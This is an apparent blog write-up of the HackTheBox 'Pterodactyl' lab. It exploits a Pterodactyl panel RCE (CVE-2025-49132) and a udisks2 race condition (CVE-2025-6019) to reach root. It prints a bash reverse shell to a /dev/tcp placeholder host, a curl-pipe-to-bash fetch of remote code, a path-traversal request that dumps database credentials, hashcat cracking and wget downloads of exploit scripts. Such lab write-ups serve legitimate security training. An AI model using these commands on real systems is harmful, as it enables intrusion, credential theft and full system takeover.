---
title: HackTheBox - Pterodactyl
author: r2cook
categories:
  - HackTheBox
tags:
  - cve-2025-49132
  - cve-2025-6019
  - pterodactyl
  - php-pear
  - RCE
  - udisks2
  - lpe
  - toctou
  - race-condition
  - xfs
  - curl
  - jq
  - vhost
  - hashcat
  - hashid
  - PrivEsc
render_with_liquid: false
media_subpath: /images/htb/Pterodactyl/
image:
  path: room_image.png
date: 2026-04-19
---

> In this walkthrough, we compromise the Hack The Box **Pterodactyl** machine by enumerating a **Pterodactyl panel instance**, exploiting an **unauthenticated RCE vulnerability (CVE-2025-49132)** to gain initial access as `wwwrun`, extracting **database credentials**, cracking user password hashes with **Hashcat**, and pivoting to SSH access as `phileasfogg3`. Finally, we escalate privileges to root by abusing a **udisks2 TOCTOU race condition (CVE-2025-6019)** to obtain a root shell.

---
## Initial Setup

First things first, let’s add the target to our hosts file:

```plaintext
10.129.20.93 pterodactyl.htb
````
{: file="/etc/hosts" }

---

## Enumeration

### Full Port Scan

```shell
$ rustscan -a pterodactyl.htb -g
10.129.20.93 -> [22,80]

$ nmap -sC -sV -Pn -T4 -p 22,80 -oA scan pterodactyl.htb    
Starting Nmap 7.99 ( https://nmap.org ) at 2026-04-19 12:16 +0200
Nmap scan report for pterodactyl.htb (10.129.20.93)
Host is up (0.082s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6 (protocol 2.0)
| ssh-hostkey: 
|   256 a3:74:1e:a3:ad:02:14:01:00:e6:ab:b4:18:84:16:e0 (ECDSA)
|_  256 65:c8:33:17:7a:d6:52:3d:63:c3:e4:a9:60:64:2d:cc (ED25519)
80/tcp open  http    nginx 1.21.5
|_http-title: My Minecraft Server
|_http-server-header: nginx/1.21.5

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.77 seconds
```
{: .nolineno }

---

## Web (Port 80)

![](web80.png){: width="700" height="400" .shadow }

Let’s add what we found:

```plaintext
10.129.20.93 pterodactyl.htb play.pterodactyl.htb
```
{: file="/etc/hosts" }

Navigating to the subdomain just redirects us back… meh, nothing useful here.  
So yeah… time to fuzz

```shell
$ ffuf -u http://pterodactyl.htb/ \  
-H "HOST: FUZZ.pterodactyl.htb" \
-w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt \
-ac -c | tee ffuf_subdomain.txt
...
panel         [Status: 200, Size: 1897, Words: 490, Lines: 36, Duration: 461ms]
...
```
{: .nolineno }

Nice, we got something 👀

```plaintext
10.129.20.93 pterodactyl.htb play.pterodactyl.htb panel.pterodactyl.htb
```
{: file="/etc/hosts" }

Now go to:

```
panel.pterodactyl.htb
```

![](panel_subdomin_web.png){: width="700" height="400" .shadow }

We land on a login page with a “forgot password” option.

Checking cookies, we see `pterodactyl_session` — looks juicy… but yeah, without the **app key**, it’s useless for now.

![](coockie_editor.png){: width="700" height="400" .shadow }

---

## CVE-2025-49132

Pterodactyl is a free, open-source game server management panel.  
Before version **1.11.11**, it’s vulnerable to unauthenticated RCE via:

```
/locales/locale.json
```

By abusing `locale` + `namespace`, we can:

- Read config files
    
- Dump credentials
    
- Execute code

Patch note: fixed in 1.11.11  

PoC: 📌 [https://www.exploit-db.com/exploits/52341](https://www.exploit-db.com/exploits/52341)

Instead of overcomplicating things, let’s just use curl to read the config:

```shell
curl -sS --path-as-is \
  "http://panel.pterodactyl.htb/locales/locale.json?locale=../../../pterodactyl&namespace=config/database" \
  | jq .
```
{: .nolineno }

![](reading_config_database.png){: width="700" height="400" .shadow }

Boom ... database creds.

---

## Shell as wwwrun

We can use this PoC for command execution and interactive limitted basic shell:

 📌 [https://github.com/rippsec/CVE-2025-49132-PHP-PEAR.git](https://github.com/rippsec/CVE-2025-49132-PHP-PEAR.git)

```shell
git clone https://github.com/rippsec/CVE-2025-49132-PHP-PEAR.git
cd CVE-2025-49132-PHP-PEAR
python3 poc.py -H panel.pterodactyl.htb --shell
```
{: .nolineno }

Let’s drop a reverse shell file:

```plaintext
#!/bin/bash
bash -i >& /dev/tcp/<YOUR-IP>/9001 0>&1
```
{: file="shell.sh" }

Serve it:

```shell
python3 -m http.server 80
```
{: .nolineno }

Listener:

```shell
nc -nlvp 9001  
```
{: .nolineno }

Trigger it:

```shell
shell> curl <YOUR-IP>/shell.sh | bash
```
{: .nolineno }

![](shell_as_wwwrun.png){: width="700" height="400" .shadow }

And we’re in

User flag is sitting in `/home/phileasfogg3`:

![](cat_user_flag.png){: width="700" height="400" .shadow }

---

## Database Enumeration

Using the creds we got earlier:

```shell
mysql -h 127.0.0.1 -u <db_username> -p
```
{: .nolineno }

Tables:

![](show_tables.png){: width="400" height="400" .shadow }

Interesting ones:

- `users`
    
- `user_ssh_keys` (empty btw)

Check users:

![](select_users_table.png){: width="700" height="400" .shadow }

Grab the hash → save it → crack it.

```shell
hashid hashes.txt
```
{: .nolineno }

![](hashid.png){: width="700" height="400" .shadow }

```shell
hashcat -m 3200 hashes.txt /usr/share/wordlists/rockyou.txt
```
{: .nolineno }

Result:

```
$2y$10$PwO0TBZA8hLB6nuSsxRqoOuXuGi3I4AVVN2IgE7mZJLzky1vGC9Pi:[REDACTED]
```

Got the password for `phileasfogg3`.

---

## Shell as phileasfogg3

SSH in:

![](shell_as_phileasfogg3.png){: width="700" height="400" .shadow }

Let’s dig around :

```shell
find / -user $(whoami) 2>/dev/null
```
{: .nolineno }

its basically saying: _“show me every file on the system that belongs to me”_

We find mail:

```
/var/spool/mail/phileasfogg3
```

![](mail_phileasfogg3.png){: width="700" height="400" .shadow }

The email is basically a warning about suspicious activity related to **udisksd**.  
Nothing confirmed… but yeah, definitely a hint 👀

---

## CVE-2025-6019 LPE

📌 https://nvd.nist.gov/vuln/detail/cve-2025-6019  
📌 https://blog.securelayer7.net/cve-2025-6019-local-privilege-escalation/ *(great resource — explains the CVE and PoC very clearly)*  
📌 https://github.com/JM00NJ/CVE-2025-6019-udisks2-XFS-Resize-TOCTOU-Privilege-Escalation.git  

Quick idea:

This vulnerability affects `udisks2` and is based on a **TOCTOU (Time-of-Check to Time-of-Use)** race condition during XFS filesystem operations.

Meaning:

- There’s a timing issue  
- We race it  
- We win → root 😏  

---

## Root Shell

Host the exploit:

```shell
git clone https://github.com/JM00NJ/CVE-2025-6019-udisks2-XFS-Resize-TOCTOU-Privilege-Escalation.git
cd CVE-2025-6019-udisks2-XFS-Resize-TOCTOU-Privilege-Escalation
python3 -m http.server 80
```
{: .nolineno }

On target:

```shell
cd /tmp
wget <YOUR_IP>/bypass.py 
wget <YOUR_IP>/weapon.py 
wget <YOUR_IP>/trigger.sh 
```
{: .nolineno }

Run:

```shell
python3 bypass.py
```
{: .nolineno }

Logout → login again

Then:

```shell
python3 weapon.py
```
{: .nolineno }

Split your terminal like this:

![](split_terminal.png){: width="700" height="400" .shadow }

Terminal 2:

```shell
watch -n 0.1 "ls -la /tmp"
```
{: .nolineno }

Terminal 1:

```shell
chmod +x trigger.sh && ./trigger.sh
```
{: .nolineno }

Watch carefully 👀

Once you see something like:

```
drwxr-xr-x 2 root root ... blockdev.******
```

![](found_the_target_dir.png){: width="700" height="400" .shadow }

Stop the `trigger.sh` script (`Ctrl+C`) and jump into that directory.

Then run:

```shell
./pwnbash -p
```
{: .nolineno }

![](root_shell.png){: width="700" height="400" .shadow }

And yeah… root owned 

---